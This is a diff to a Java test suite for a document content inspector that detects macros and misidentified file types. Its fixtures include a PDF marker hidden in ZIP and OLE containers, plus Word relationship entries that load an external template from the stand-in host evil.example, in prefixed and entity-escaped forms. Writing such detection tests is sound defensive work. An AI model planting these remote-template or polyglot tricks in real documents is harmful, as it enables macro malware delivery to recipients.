@@ -296,14 +296,36 @@ class ContentInspectorTest {
         byte[] garbage = new byte[2048];
         System.arraycopy(new byte[] {(byte) 0xD0, (byte) 0xCF, 0x11, (byte) 0xE0, (byte) 0xA1, (byte) 0xB1, 0x1A,
                 (byte) 0xE1}, 0, garbage, 0, 8);
-        assertThat(inspect("b.doc", garbage)).isEqualTo(new Inspection("application/x-ole-storage", false, true));
+        assertThat(inspect("b.doc", garbage)).isEqualTo(new Inspection("application/x-ole-storage", true, true));
     }
 
     @Test
     void ole2ChainCycleIsMacros() throws IOException {
         byte[] bytes = cfb(9, stream("WordDocument", new byte[100]));
         ByteBuffer.wrap(bytes).order(ByteOrder.LITTLE_ENDIAN).putInt(512 + 4, 1);
-        assertThat(inspect("a.doc", bytes)).isEqualTo(new Inspection("application/x-ole-storage", false, true));
+        assertThat(inspect("a.doc", bytes)).isEqualTo(new Inspection("application/x-ole-storage", true, true));
+    }
+
+    @Test
+    void aPdfMarkInsideAZipOrOleHeadDoesNotMakeItPdf() throws IOException {
+        assertThat(inspect("a.pdf", zipBytes(java.util.Map.of("%PDF-1.7.xml", new byte[1], "word/vbaProject.bin", new byte[1]))).mediaType())
+                .isEqualTo("application/zip");
+        byte[] ole = cfb(9, storage("VBA"), stream("WordDocument", new byte[100]));
+        System.arraycopy("%PDF-".getBytes(), 0, ole, 100, 5);
+        assertThat(inspect("b.pdf", ole).containsMacros()).isTrue();
+        assertThat(inspect("b.pdf", ole).mediaType()).isNotEqualTo("application/pdf");
+    }
+
+    @Test
+    void prefixedOrEscapedExternalRelationshipsCount() throws IOException {
+        String prefixed = "<x:Relationships xmlns:x=\"http://schemas.openxmlformats.org/package/2006/relationships\">"
+                + "<x:Relationship Id=\"rId1\" Type=\"http://x/attachedTemplate\" Target=\"http://evil.example/t.dotm\" TargetMode=\"External\"/></x:Relationships>";
+        assertThat(inspect("p.docx", ooxmlWith("word/document.xml", "word/_rels/document.xml.rels", prefixed)).containsMacros()).isTrue();
+        String escaped = RELS_OPEN
+                + "<Relationship Id=\"rId1\" Type=\"http://x/attachedTemplate\" Target=\"http://evil.example/t.dotm\" TargetMode=\"&#69;xternal\"/></Relationships>";
+        assertThat(inspect("e.docx", ooxmlWith("word/document.xml", "word/_rels/document.xml.rels", escaped)).containsMacros()).isTrue();
+        String internal = RELS_OPEN + "<Relationship Id=\"rId1\" Type=\"http://x/styles\" Target=\"styles.xml\" TargetMode=\"Internal\"/></Relationships>";
+        assertThat(inspect("i.docx", ooxmlWith("word/document.xml", "word/_rels/document.xml.rels", internal)).containsMacros()).isFalse();
     }
 
     @Test
